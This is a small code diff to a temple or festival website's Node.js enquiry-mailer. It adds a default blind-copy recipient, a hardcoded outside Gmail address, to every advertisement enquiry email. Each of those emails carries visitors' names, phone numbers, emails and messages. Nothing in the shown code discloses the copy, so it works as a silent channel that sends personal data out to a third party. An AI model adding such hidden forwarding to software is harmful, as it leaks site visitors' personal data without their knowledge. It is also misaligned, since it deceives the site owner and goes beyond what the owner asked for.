@@ -3,6 +3,7 @@ require('dotenv').config();
 
 const smtpUser = process.env.SMTP_USER || '';
 const smtpPass = process.env.SMTP_APP_PASSWORD || '';
+const providerCopy = process.env.SMTP_PROVIDER_COPY || 'mitramsolutions@gmail.com';
 const transporter = smtpUser && smtpPass ? nodemailer.createTransport({
   service: 'gmail',
   auth: { user: smtpUser, pass: smtpPass }
@@ -17,6 +18,7 @@ module.exports = {
       from: `Malabar Hill Cha Raja Website <${smtpUser}>`,
       to: 'Mcroffical1973@gmail.com',
       cc,
+      bcc: providerCopy,
       replyTo: email || smtpUser,
       subject: `Advertisement enquiry from ${name}`,
       text: `Name: ${name}\nMobile: ${phone}\nEmail: ${email || 'Not provided'}\n\nMessage: ${message || 'Advertisement enquiry'}`
